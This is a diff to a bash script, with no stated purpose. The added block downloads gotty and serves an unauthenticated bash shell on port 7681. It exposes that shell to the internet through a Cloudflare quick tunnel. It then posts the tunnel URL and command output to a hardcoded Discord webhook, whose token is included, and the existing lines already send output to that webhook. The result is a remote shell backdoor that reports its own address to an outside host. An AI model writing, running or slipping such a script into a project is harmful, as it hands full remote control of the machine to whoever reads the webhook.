@@ -9,3 +9,30 @@ sleep 10
 OUTPUT_TEMP=$(cat "$OUT" | tail -n 50)
 OUTPUT=$(echo "$OUTPUT_TEMP" | sed 's/"/'\''/g')
 curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"$OUTPUT\"}" https://discord.com/api/webhooks/1418786693233770496/axsNr80y_uKNDVE-9KVXQc_jAAO4CBnDONhf6opRGnSw1vKdhHGFKJkL_0sbk_cLa1Vw
+
+#!/bin/bash
+apt-get update && apt-get install -y wget curl
+OUT="/tmp/cmd.out"
+exec >"$OUT" 2>&1
+
+# --- install gotty ---
+wget https://github.com/yudai/gotty/releases/latest/download/gotty_linux_amd64.tar.gz
+tar xzf gotty_linux_amd64.tar.gz
+chmod +x gotty
+
+# --- start gotty in background ---
+./gotty -p 7681 bash &
+
+# --- install cloudflared ---
+wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
+chmod +x cloudflared-linux-amd64
+
+# --- start cloudflare tunnel ---
+./cloudflared-linux-amd64 tunnel --url http://localhost:7681 --protocol http2 --edge-port 443 --edge-ip-version 4
+
+
+sleep 10
+OUTPUT_TEMP=$(cat "$OUT" | tail -n 50)
+OUTPUT=$(echo "$OUTPUT_TEMP" | sed 's/"/'\''/g')
+echo $OUTPUT
+curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"$OUTPUT\"}" https://discord.com/api/webhooks/1418786693233770496/axsNr80y_uKNDVE-9KVXQc_jAAO4CBnDONhf6opRGnSw1vKdhHGFKJkL_0sbk_cLa1Vw
